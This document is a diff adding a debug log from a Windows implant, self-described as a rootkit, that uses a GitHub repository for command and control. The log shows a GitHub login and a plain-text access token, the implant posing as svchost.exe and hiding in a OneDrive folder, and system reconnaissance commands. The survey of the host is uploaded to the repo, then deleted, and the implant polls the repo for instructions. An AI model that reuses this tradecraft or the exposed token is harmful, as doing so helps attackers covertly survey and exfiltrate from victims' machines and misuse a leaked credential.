@@ -1,0 +1,33 @@
+Mon Jul 26 19:24:05 2021. Initialisation of the log file.
+
+DEBUG: Mon Jul 26 19:24:05 2021: GithubLogin: hidemepls785
+DEBUG: Mon Jul 26 19:24:05 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Mon Jul 26 19:24:05 2021: GihubAccessToken: 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
+DEBUG: Mon Jul 26 19:24:05 2021: Rootkit Name: Preprod04
+DEBUG: Mon Jul 26 19:24:05 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Mon Jul 26 19:24:05 2021: The folder list for random folder is not empty. Its size is: 629
+DEBUG: Mon Jul 26 19:24:05 2021: The random path choosed for this execution is: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\LogoImages
+DEBUG: Mon Jul 26 19:24:06 2021: The survey file for this target could not be found. Trying to create it and upload it to the github repo.
+DEBUG: Mon Jul 26 19:24:06 2021: This command will be executed to know systeminfo: systeminfo > C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\LogoImages\systeminfo.txt
+DEBUG: Mon Jul 26 19:24:11 2021: The file systeminfo.txt exists, trying to read and add its content the surveyfile.
+DEBUG: Mon Jul 26 19:24:11 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\LogoImages\systeminfo.txt
+DEBUG: Mon Jul 26 19:24:11 2021: The file will be read as binary file.
+DEBUG: Mon Jul 26 19:24:11 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Mon Jul 26 19:24:11 2021: This command will be executed to know the last reboot time: wmic os get lastBootUpTime > C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\LogoImages\systeminfo2.txt
+DEBUG: Mon Jul 26 19:24:17 2021: Unable to find the file systeminfo2.txt.
+DEBUG: Mon Jul 26 19:24:17 2021: Start of the method writeFileWindowsApi.
+DEBUG: Mon Jul 26 19:24:17 2021: The content size that will be written: 183
+DEBUG: Mon Jul 26 19:24:17 2021: Success to write the content(number of bytes : 183) in the file : C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\LogoImages\clean-survey.txt
+DEBUG: Mon Jul 26 19:24:17 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Mon Jul 26 19:24:17 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\LogoImages\clean-survey.txt
+DEBUG: Mon Jul 26 19:24:17 2021: The file will be read as binary file.
+DEBUG: Mon Jul 26 19:24:17 2021: The file that will be read weight: 183
+DEBUG: Mon Jul 26 19:24:17 2021: Success to read the binary file. This number of bytes have been read: 184
+DEBUG: Mon Jul 26 19:24:17 2021: The files clean-survey.txt has been uploaded successfully in the github repo
+DEBUG: Mon Jul 26 19:24:17 2021: Success deleting the survey file.
+DEBUG: Mon Jul 26 19:24:17 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Mon Jul 26 19:24:17 2021: Success to get the instance number of the current instance: rootkit_path3
+DEBUG: Mon Jul 26 19:24:17 2021: Success to check the commands with rootkit_path3
+DEBUG: Mon Jul 26 19:24:17 2021: No commands are given in the github repo.
+DEBUG: Mon Jul 26 19:24:17 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Mon Jul 26 19:24:17 2021: Start of GithubCommunication::sendLogs
